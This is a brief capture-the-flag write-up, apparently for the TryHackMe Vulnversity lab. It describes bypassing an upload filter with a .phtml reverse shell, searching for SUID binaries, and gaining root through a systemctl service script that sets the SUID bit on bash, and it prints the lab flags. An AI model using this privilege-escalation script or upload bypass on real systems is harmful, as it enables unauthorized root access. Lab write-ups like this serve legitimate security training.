# writeups (suite 2)



`http://10.10.222.123:3333/internal/`

in this page I found an upload form so, let's try php reversehell, but this
one has some restriction about the extension file, so we choose one *.phtml*, but there are
so many to try, like php4, php5 and so on, but the phtml works so let's continue, while I'm
gonna upload the file, I set my netcat on listenning, don't forget the /uploads we discover
before, and after we got the revshell and also the user bill flag
`8bd7992fbe8a6ad22a63361004cfcedb`, and let's try to get root flag too.

I used this `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;` to look for some binary with
suid, and guess what? I found one, here it is,
`-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl`, so let's go on GTFobins to look
for some way to go through the root, It was a little difficult but with some help in some writeups I got it
through  this script

```
#!/bin/bash

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
``` 
and after I run it I did `/bin/bash -p` and here the root priv, ey we got the root flag

`a58ff8579f0a9270368d33a9966c7fd5`

this writeups help me in the last part to mke the script and get the root
credit: https://leosmith.xyz/blog/vulnversity-tryhackme-writeup.html
